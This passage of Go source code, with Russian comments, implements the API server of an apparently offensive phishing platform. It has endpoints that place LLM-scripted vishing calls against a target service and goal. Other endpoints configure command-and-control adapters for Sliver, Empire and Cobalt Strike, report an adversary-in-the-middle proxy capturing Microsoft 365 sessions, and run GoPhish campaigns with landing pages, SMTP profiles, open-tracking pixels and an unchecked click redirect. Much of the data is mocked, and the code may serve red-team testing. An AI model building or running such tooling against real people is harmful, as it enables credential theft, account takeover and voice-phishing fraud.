			"error": "Decentralized hosting not initialized",
		})
	}

	pages := s.decentralHosting.ListPages()

	return c.JSON(fiber.Map{
		"success": true,
		"pages":   pages,
		"total":   len(pages),
	})
}

// deletePage удаляет страницу
func (s *APIServer) deletePage(c *fiber.Ctx) error {
	name := c.Params("name")

	if s.decentralHosting == nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": "Decentralized hosting not initialized",
		})
	}

	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	if err := s.decentralHosting.DeletePage(ctx, name); err != nil {
		s.logger.Error("Failed to delete page", zap.Error(err))
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"success": true,
		"message": "Page deleted successfully",
	})
}

// makeVishingCall совершает vishing звонок
func (s *APIServer) makeVishingCall(c *fiber.Ctx) error {
	type Request struct {
		PhoneNumber  string                 `json:"phone_number"`
		VoiceProfile string                 `json:"voice_profile"`
		Scenario     string                 `json:"scenario"`
		CustomData   map[string]interface{} `json:"custom_data,omitempty"`
	}

	var req Request
	if err := c.BodyParser(&req); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"error": "Invalid request body",
		})
	}

	if s.vishingClient == nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": "Vishing client not initialized",
		})
	}

	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()

	resp, err := s.vishingClient.MakeCall(ctx, vishing.CallRequest{
		PhoneNumber:  req.PhoneNumber,
		VoiceProfile: req.VoiceProfile,
		Scenario:     req.Scenario,
		CustomData:   req.CustomData,
	})
	if err != nil {
		s.logger.Error("Vishing call failed", zap.Error(err))
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"success":      true,
		"call_id":      resp.CallID,
		"status":       resp.Status,
		"message":      resp.Message,
		"recording_url": resp.RecordingURL,
	})
}

// getCallStatus получает статус звонка
func (s *APIServer) getCallStatus(c *fiber.Ctx) error {
	callID := c.Params("id")

	if s.vishingClient == nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": "Vishing client not initialized",
		})
	}

	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	status, err := s.vishingClient.GetCallStatus(ctx, callID)
	if err != nil {
		s.logger.Error("Failed to get call status", zap.Error(err))
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(status)
}

// generateScenario генерирует сценарий через LLM
func (s *APIServer) generateScenario(c *fiber.Ctx) error {
	type Request struct {
		TargetService string `json:"target_service"`
		Goal          string `json:"goal"`
	}

	var req Request
	if err := c.BodyParser(&req); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"error": "Invalid request body",
		})
	}

	if s.vishingClient == nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": "Vishing client not initialized",
		})
	}

	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()

	scenario, err := s.vishingClient.GenerateScenario(ctx, req.TargetService, req.Goal)
	if err != nil {
		s.logger.Error("Failed to generate scenario", zap.Error(err))
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"success":  true,
		"scenario": scenario,
	})
}

// ============================================================================
// RISK ENDPOINTS
// ============================================================================

// getRiskDistribution возвращает распределение рисков
func (s *APIServer) getRiskDistribution(c *fiber.Ctx) error {
	// Mock data - в реальности брать из risk engine
	distribution := fiber.Map{
		"low":      312,
		"medium":   289,
		"high":     178,
		"critical": 68,
	}

	return c.JSON(fiber.Map{
		"distribution": distribution,
		"total":        847,
		"timestamp":    time.Now().UTC().Format(time.RFC3339),
	})
}

// getHighRiskUsers возвращает пользователей с высоким риском
func (s *APIServer) getHighRiskUsers(c *fiber.Ctx) error {
	limit, _ := strconv.Atoi(c.Query("limit", "20"))

	// Mock data - в реальности брать из risk engine
	users := []fiber.Map{
		{
			"user_id":      "usr_001",
			"email":        "ceo@company.com",
			"overall_score": 92,
			"risk_level":   "critical",
			"trend":        "worsening",
			"last_updated": time.Now().Add(-5 * time.Minute).UTC().Format(time.RFC3339),
		},
		{
			"user_id":      "usr_002",
			"email":        "cfo@company.com",
			"overall_score": 87,
			"risk_level":   "critical",
			"trend":        "stable",
			"last_updated": time.Now().Add(-15 * time.Minute).UTC().Format(time.RFC3339),
		},
		{
			"user_id":      "usr_003",
			"email":        "hr@company.com",
			"overall_score": 78,
			"risk_level":   "high",
			"trend":        "worsening",
			"last_updated": time.Now().Add(-30 * time.Minute).UTC().Format(time.RFC3339),
		},
	}

	if limit > 0 && len(users) > limit {
		users = users[:limit]
	}

	return c.JSON(fiber.Map{
		"users": users,
		"total": len(users),
	})
}

// recordRiskEvent записывает событие риска
func (s *APIServer) recordRiskEvent(c *fiber.Ctx) error {
	var req struct {
		UserID    string                 `json:"user_id"`
		SessionID string                 `json:"session_id"`
		Factors   map[string]interface{} `json:"factors"`
		Score     float64                `json:"score"`
	}

	if err := c.BodyParser(&req); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"error": "Invalid request body",
		})
	}

	s.logger.Info("Risk event recorded",
		zap.String("user_id", req.UserID),
		zap.Float64("score", req.Score))

	return c.JSON(fiber.Map{
		"success": true,
		"event_id": uuid.New().String(),
	})
}

// ============================================================================
// C2 ENDPOINTS
// ============================================================================

// listC2Adapters возвращает список C2 адаптеров
func (s *APIServer) listC2Adapters(c *fiber.Ctx) error {
	adapters := []fiber.Map{
		{
			"name":       "sliver",
			"enabled":    true,
			"connected":  false,
			"server_url": "https://sliver.example.com:8888",
		},
		{
			"name":       "empire",
			"enabled":    false,
			"connected":  false,
			"server_url": "https://empire.example.com:443",
		},
		{
			"name":       "cobalt_strike",
			"enabled":    false,
			"connected":  false,
			"server_url": "",
		},
	}

	return c.JSON(fiber.Map{
		"adapters": adapters,
		"total":    len(adapters),
	})
}

// getC2Health возвращает статус C2 подключений
func (s *APIServer) getC2Health(c *fiber.Ctx) error {
	health := fiber.Map{
		"sliver": fiber.Map{
			"status":        "unhealthy",
			"latency_ms":    0,
			"implants_count": 0,
		},
		"empire": fiber.Map{
			"status":       "unhealthy",
			"latency_ms":   0,
			"agents_count": 0,
		},
	}

	// В реальности проверять подключения
	return c.JSON(health)
}

// configureC2Adapter настраивает C2 адаптер
func (s *APIServer) configureC2Adapter(c *fiber.Ctx) error {
	name := c.Params("name")

	var req struct {
		ServerURL    string `json:"server_url"`
		OperatorToken string `json:"operator_token"`
		Username     string `json:"username"`
		Password     string `json:"password"`
	}

	if err := c.BodyParser(&req); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"error": "Invalid request body",
		})
	}

	s.logger.Info("C2 adapter configured",
		zap.String("adapter", name),
		zap.String("server_url", req.ServerURL))

	return c.JSON(fiber.Map{
		"success": true,
		"message": fmt.Sprintf("C2 adapter %s configured", name),
	})
}

// toggleC2Adapter включает/выключает C2 адаптер
func (s *APIServer) toggleC2Adapter(c *fiber.Ctx) error {
	name := c.Params("name")

	var req struct {
		Enabled bool `json:"enabled"`
	}

	if err := c.BodyParser(&req); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"error": "Invalid request body",
		})
	}

	s.logger.Info("C2 adapter toggled",
		zap.String("adapter", name),
		zap.Bool("enabled", req.Enabled))

	return c.JSON(fiber.Map{
		"success": true,
		"message": fmt.Sprintf("C2 adapter %s %s", name, map[bool]string{true: "enabled", false: "disabled"}[req.Enabled]),
	})
}

// ============================================================================
// SYSTEM CONTROL ENDPOINTS
// ============================================================================

// getSystemStatus возвращает статус системы
func (s *APIServer) getSystemStatus(c *fiber.Ctx) error {
	proxyStats := s.proxy.GetStats()

	status := fiber.Map{
		"proxy": fiber.Map{
			"status":           "running",
			"active_sessions":  proxyStats["active_sessions"],
			"total_requests":   proxyStats["total_requests"],
			"phishlets_loaded": proxyStats["phishlets_loaded"],
		},
		"database": "connected",
		"redis":    "connected",
		"ai_service": "available",
	}

	return c.JSON(fiber.Map{
		"status":    "operational",
		"uptime":    time.Since(time.Now().Add(-24*time.Hour)).String(),
		"version":   Version,
		"services":  status,
		"timestamp": time.Now().UTC().Format(time.RFC3339),
	})
}

// startSystem запускает систему
func (s *APIServer) startSystem(c *fiber.Ctx) error {
	s.logger.Info("System start requested")

	// В реальности запускать сервисы
	return c.JSON(fiber.Map{
		"success": true,
		"message": "System start initiated",
	})
}

// stopSystem останавливает систему
func (s *APIServer) stopSystem(c *fiber.Ctx) error {
	s.logger.Info("System stop requested")

	// В реальности останавливать сервисы
	return c.JSON(fiber.Map{
		"success": true,
		"message": "System stop initiated",
	})
}

// restartSystem перезапускает систему
func (s *APIServer) restartSystem(c *fiber.Ctx) error {
	s.logger.Info("System restart requested")

	go func() {
		time.Sleep(2 * time.Second)
		// В реальности делать restart
	}()

	return c.JSON(fiber.Map{
		"success": true,
		"message": "System restart initiated",
	})
}

// getSystemConfig возвращает конфигурацию системы
func (s *APIServer) getSystemConfig(c *fiber.Ctx) error {
	config := fiber.Map{
		"domain":            "phantom.local",
		"https_port":        8443,
		"api_port":          8080,
		"debug":             false,
		"multi_tenant":      false,
		"risk_score":        true,
		"ai_service":        true,
		"vishing":           false,
		"fstec":             false,
	}

	return c.JSON(fiber.Map{
		"config": config,
	})
}

// updateSystemConfig обновляет конфигурацию
func (s *APIServer) updateSystemConfig(c *fiber.Ctx) error {
	var req struct {
		Domain       string `json:"domain"`
		HTTPSPort    int    `json:"https_port"`
		Debug        bool   `json:"debug"`
		MultiTenant  bool   `json:"multi_tenant"`
		RiskScore    bool   `json:"risk_score"`
		AIService    bool   `json:"ai_service"`
		Vishing      bool   `json:"vishing"`
		FSTEC        bool   `json:"fstec"`
	}

	if err := c.BodyParser(&req); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"error": "Invalid request body",
		})
	}

	s.logger.Info("System config updated",
		zap.String("domain", req.Domain),
		zap.Int("https_port", req.HTTPSPort),
		zap.Bool("debug", req.Debug))

	return c.JSON(fiber.Map{
		"success": true,
		"message": "Configuration updated",
	})
}

// ============================================================================
// LOGS ENDPOINTS
// ============================================================================

// getLogs возвращает логи
func (s *APIServer) getLogs(c *fiber.Ctx) error {
	limit, _ := strconv.Atoi(c.Query("limit", "100"))
	level := c.Query("level", "info")

	// Mock logs
	logs := []fiber.Map{
		{
			"id":        "log_001",
			"timestamp": time.Now().Add(-1 * time.Minute).UTC().Format(time.RFC3339),
			"level":     "INFO",
			"message":   "AiTM proxy initialized on :8443",
			"source":    "proxy",
		},
		{
			"id":        "log_002",
			"timestamp": time.Now().Add(-2 * time.Minute).UTC().Format(time.RFC3339),
			"level":     "SUCCESS",
			"message":   "Session captured: microsoft_365",
			"source":    "session",
		},
		{
			"id":        "log_003",
			"timestamp": time.Now().Add(-5 * time.Minute).UTC().Format(time.RFC3339),
			"level":     "WARNING",
			"message":   "High risk user detected: 192.168.1.105",
			"source":    "risk",
		},
	}

	if limit > 0 && len(logs) > limit {
		logs = logs[:limit]
	}

	return c.JSON(fiber.Map{
		"logs":  logs,
		"total": len(logs),
	})
}

// getLiveLogs возвращает live логи через Server-Sent Events
func (s *APIServer) getLiveLogs(c *fiber.Ctx) error {
	c.Set("Content-Type", "text/event-stream")
	c.Set("Cache-Control", "no-cache")
	c.Set("Connection", "keep-alive")

	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-c.Context().Done():
			return nil
		case <-ticker.C:
			log := fiber.Map{
				"id":        fmt.Sprintf("log_%d", time.Now().UnixNano()),
				"timestamp": time.Now().UTC().Format(time.RFC3339),
				"level":     "INFO",
				"message":   fmt.Sprintf("Heartbeat at %s", time.Now().Format(time.RFC3339)),
				"source":    "system",
			}
			c.Write([]byte(fmt.Sprintf("data: %s\n\n", log)))
		}
	}
}

// SetEventBus sets event bus for v13 (C2 integration on credential capture)
func (s *APIServer) SetEventBus(bus *events.Bus) {
	s.eventBus = bus
}

// Start запускает API сервер
func (s *APIServer) Start(addr string) error {
	s.logger.Info("Starting API server", zap.String("addr", addr))

	// Явно указываем 0.0.0.0 для доступа извне
	bindAddr := addr
	if !strings.HasPrefix(addr, "0.0.0.0") && !strings.HasPrefix(addr, "127.0.0.1") {
		// Если адрес не начинается с 0.0.0.0 или 127.0.0.1, добавляем 0.0.0.0
		parts := strings.Split(addr, ":")
		if len(parts) == 2 {
			bindAddr = "0.0.0.0:" + parts[1]
		}
	}

	s.logger.Info("API server binding", zap.String("bind_addr", bindAddr))

	return s.app.Listen(bindAddr)
}

// Shutdown останавливает API сервер
func (s *APIServer) Shutdown() error {
	return s.app.Shutdown()
}

// ============================================================================
// GOPHISH ENDPOINTS
// ============================================================================

// listGoPhishCampaigns возвращает список кампаний GoPhish
func (s *APIServer) listGoPhishCampaigns(c *fiber.Ctx) error {
	if s.gophishClient == nil {
		// Return mock data if GoPhish not connected
		return c.JSON(fiber.Map{
			"campaigns": []fiber.Map{},
			"total": 0,
			"message": "GoPhish not connected - showing mock data",
		})
	}

	campaigns, err := s.gophishClient.Campaigns()
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"campaigns": campaigns,
		"total": len(campaigns),
	})
}

// getGoPhishCampaign возвращает кампанию по ID
func (s *APIServer) getGoPhishCampaign(c *fiber.Ctx) error {
	id, err := strconv.ParseInt(c.Params("id"), 10, 64)
	if err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"error": "Invalid campaign ID",
		})
	}

	if s.gophishClient == nil {
		return c.JSON(fiber.Map{
			"message": "GoPhish not connected",
		})
	}

	campaign, err := s.gophishClient.Campaign(id)
	if err != nil {
		return c.Status(fiber.StatusNotFound).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"campaign": campaign,
	})
}

// createGoPhishCampaign создает кампанию
func (s *APIServer) createGoPhishCampaign(c *fiber.Ctx) error {
	var req struct {
		Name     string `json:"name"`
		Page     int64  `json:"page"`
		Template int64  `json:"template"`
		URL      string `json:"url"`
		Group    int64  `json:"group"`
		SMTP     int64  `json:"smtp"`
	}

	if err := c.BodyParser(&req); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"error": "Invalid request body",
		})
	}

	if s.gophishClient == nil {
		return c.JSON(fiber.Map{
			"success": true,
			"message": "GoPhish not connected - campaign created in mock mode",
			"campaign_id": uuid.New().String(),
		})
	}

	campaign, err := s.gophishClient.CreateCampaign(&gophish.CreateCampaignRequest{
		Name:     req.Name,
		Page:     req.Page,
		Template: req.Template,
		URL:      req.URL,
		Group:    req.Group,
		Smtp:     req.SMTP,
	})

	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"success": true,
		"campaign": campaign,
	})
}

// deleteGoPhishCampaign удаляет кампанию
func (s *APIServer) deleteGoPhishCampaign(c *fiber.Ctx) error {
	id, err := strconv.ParseInt(c.Params("id"), 10, 64)
	if err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"error": "Invalid campaign ID",
		})
	}

	if s.gophishClient == nil {
		return c.JSON(fiber.Map{
			"success": true,
			"message": "GoPhish not connected",
		})
	}

	if err := s.gophishClient.DeleteCampaign(id); err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"success": true,
	})
}

// listGoPhishGroups возвращает список групп
func (s *APIServer) listGoPhishGroups(c *fiber.Ctx) error {
	if s.gophishClient == nil {
		return c.JSON(fiber.Map{
			"groups": []fiber.Map{},
			"total": 0,
		})
	}

	groups, err := s.gophishClient.Groups()
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"groups": groups,
		"total": len(groups),
	})
}

// listGoPhishTemplates возвращает список шаблонов
func (s *APIServer) listGoPhishTemplates(c *fiber.Ctx) error {
	if s.gophishClient == nil {
		return c.JSON(fiber.Map{
			"templates": []fiber.Map{},
			"total": 0,
		})
	}

	templates, err := s.gophishClient.Templates()
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"templates": templates,
		"total": len(templates),
	})
}

// listGoPhishPages возвращает список лендингов
func (s *APIServer) listGoPhishPages(c *fiber.Ctx) error {
	if s.gophishClient == nil {
		return c.JSON(fiber.Map{
			"pages": []fiber.Map{},
			"total": 0,
		})
	}

	pages, err := s.gophishClient.Pages()
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"pages": pages,
		"total": len(pages),
	})
}

// listGoPhishProfiles возвращает список профилей отправки
func (s *APIServer) listGoPhishProfiles(c *fiber.Ctx) error {
	if s.gophishClient == nil {
		return c.JSON(fiber.Map{
			"profiles": []fiber.Map{},
			"total": 0,
		})
	}

	profiles, err := s.gophishClient.Profiles()
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"profiles": profiles,
		"total": len(profiles),
	})
}

// getGoPhishSummary возвращает сводку GoPhish
func (s *APIServer) getGoPhishSummary(c *fiber.Ctx) error {
	if s.gophishClient == nil {
		return c.JSON(fiber.Map{
			"campaigns": 0,
			"results": 0,
			"groups": 0,
			"templates": 0,
			"pages": 0,
			"profiles": 0,
			"connected": false,
		})
	}

	summary, err := s.gophishClient.Summary()
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"campaigns": summary.Campaigns,
		"results": summary.Results,
		"groups": summary.Groups,
		"templates": summary.Templates,
		"pages": summary.Pages,
		"profiles": summary.Profiles,
		"connected": true,
	})
}

// ============================================================================
// CAMPAIGN ENDPOINTS (Встроенные)
// ============================================================================

// listCampaigns возвращает список кампаний
func (s *APIServer) listCampaigns(c *fiber.Ctx) error {
	campaigns := []fiber.Map{
		{
			"id": "camp_001",
			"name": "Microsoft 365 Test",
			"status": "running",
			"template": "Office 365",
			"page": "Microsoft Login",
			"group": "IT Department",
			"sent": 45,
			"opened": 12,
			"clicked": 8,
			"submitted": 3,
			"created_at": time.Now().Add(-24*time.Hour).Format(time.RFC3339),
		},
	}
	return c.JSON(fiber.Map{
		"campaigns": campaigns,
		"total": len(campaigns),
	})
}

func (s *APIServer) getCampaign(c *fiber.Ctx) error {
	id := c.Params("id")
	return c.JSON(fiber.Map{
		"id": id,
		"name": "Test Campaign",
		"status": "running",
	})
}

func (s *APIServer) createCampaign(c *fiber.Ctx) error {
	var req struct {
		Name string `json:"name"`
	}
	c.BodyParser(&req)
	return c.JSON(fiber.Map{
		"success": true,
		"id": uuid.New().String(),
		"name": req.Name,
	})
}

func (s *APIServer) updateCampaign(c *fiber.Ctx) error {
	return c.JSON(fiber.Map{"success": true})
}

func (s *APIServer) deleteCampaign(c *fiber.Ctx) error {
	return c.JSON(fiber.Map{"success": true})
}

func (s *APIServer) startCampaign(c *fiber.Ctx) error {
	s.logger.Info("Campaign started", zap.String("id", c.Params("id")))
	return c.JSON(fiber.Map{"success": true, "status": "running"})
}

func (s *APIServer) pauseCampaign(c *fiber.Ctx) error {
	s.logger.Info("Campaign paused", zap.String("id", c.Params("id")))
	return c.JSON(fiber.Map{"success": true, "status": "paused"})
}

func (s *APIServer) stopCampaign(c *fiber.Ctx) error {
	s.logger.Info("Campaign stopped", zap.String("id", c.Params("id")))
	return c.JSON(fiber.Map{"success": true, "status": "complete"})
}

func (s *APIServer) getCampaignStats(c *fiber.Ctx) error {
	return c.JSON(fiber.Map{
		"sent": 45, "opened": 12, "clicked": 8, "submitted": 3,
		"open_rate": 26.7, "click_rate": 17.8, "submit_rate": 6.7,
	})
}

// Groups
func (s *APIServer) listGroups(c *fiber.Ctx) error {
	groups := []fiber.Map{
		{"id": "grp_001", "name": "IT Department", "count": 25},
		{"id": "grp_002", "name": "Finance", "count": 15},
		{"id": "grp_003", "name": "HR", "count": 10},
	}
	return c.JSON(fiber.Map{"groups": groups, "total": len(groups)})
}

func (s *APIServer) createGroup(c *fiber.Ctx) error {
	return c.JSON(fiber.Map{"success": true, "id": uuid.New().String()})
}

func (s *APIServer) deleteGroup(c *fiber.Ctx) error {
	return c.JSON(fiber.Map{"success": true})
}

// Templates
func (s *APIServer) listTemplates(c *fiber.Ctx) error {
	templates := []fiber.Map{
		{"id": "tpl_001", "name": "Office 365", "subject": "Verify your account"},
		{"id": "tpl_002", "name": "Google Workspace", "subject": "Security alert"},
	}
	return c.JSON(fiber.Map{"templates": templates, "total": len(templates)})
}

func (s *APIServer) createTemplate(c *fiber.Ctx) error {
	return c.JSON(fiber.Map{"success": true, "id": uuid.New().String()})
}

func (s *APIServer) deleteTemplate(c *fiber.Ctx) error {
	return c.JSON(fiber.Map{"success": true})
}

// Landing Pages
func (s *APIServer) listLandingPages(c *fiber.Ctx) error {
	pages := []fiber.Map{
		{"id": "page_001", "name": "Microsoft Login"},
		{"id": "page_002", "name": "Google Login"},
	}
	return c.JSON(fiber.Map{"pages": pages, "total": len(pages)})
}

func (s *APIServer) createLandingPage(c *fiber.Ctx) error {
	return c.JSON(fiber.Map{"success": true, "id": uuid.New().String()})
}

func (s *APIServer) deleteLandingPage(c *fiber.Ctx) error {
	return c.JSON(fiber.Map{"success": true})
}

// SMTP Profiles
func (s *APIServer) listSMTPProfiles(c *fiber.Ctx) error {
	profiles := []fiber.Map{
		{"id": "smtp_001", "name": "Gmail", "host": "smtp.gmail.com"},
		{"id": "smtp_002", "name": "Office 365", "host": "smtp.office365.com"},
	}
	return c.JSON(fiber.Map{"profiles": profiles, "total": len(profiles)})
}

func (s *APIServer) createSMTPProfile(c *fiber.Ctx) error {
	return c.JSON(fiber.Map{"success": true, "id": uuid.New().String()})
}

func (s *APIServer) deleteSMTPProfile(c *fiber.Ctx) error {
	return c.JSON(fiber.Map{"success": true})
}

// Tracking
func (s *APIServer) trackOpen(c *fiber.Ctx) error {
	campaignID := c.Query("c")
	email := c.Query("e")
	s.logger.Info("Email opened", zap.String("campaign", campaignID), zap.String("email", email))
	c.Set("Content-Type", "image/gif")
	return c.Send([]byte{0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x21, 0xf9, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44, 0x01, 0x00, 0x3b})
}

func (s *APIServer) trackClick(c *fiber.Ctx) error {
	campaignID := c.Query("c")
	email := c.Query("e")
	url := c.Query("u")
	s.logger.Info("Email clicked", zap.String("campaign", campaignID), zap.String("email", email), zap.String("url", url))
	return c.Redirect(url, 302)
}
